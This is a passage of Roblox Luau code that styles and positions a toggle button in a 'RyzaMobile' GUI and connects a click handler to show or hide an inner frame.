		OpenButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		OpenButton.BackgroundTransparency = 0.3
		OpenButton.BorderSizePixel = 0
		OpenButton.Size = UDim2.new(0, 91, 0, 32)
		OpenButton.Parent = RyzaMobile

		local UICorner = Instance.new("UICorner")
		UICorner.CornerRadius = UDim.new(0, 10)
		UICorner.Parent = OpenButton

		local UIListLayout = Instance.new("UIListLayout")
		UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Right
		UIListLayout.VerticalAlignment = Enum.VerticalAlignment.Bottom
		UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
		UIListLayout.Parent = RyzaMobile

		local UIPadding = Instance.new("UIPadding")
		UIPadding.PaddingBottom = UDim.new(0, 20)
		UIPadding.PaddingRight = UDim.new(0, 20)
		UIPadding.Parent = RyzaMobile

		OpenButton.MouseButton1Click:Connect(function()
			InnerFrame.Visible = not InnerFrame.Visible
		end)
	end
end
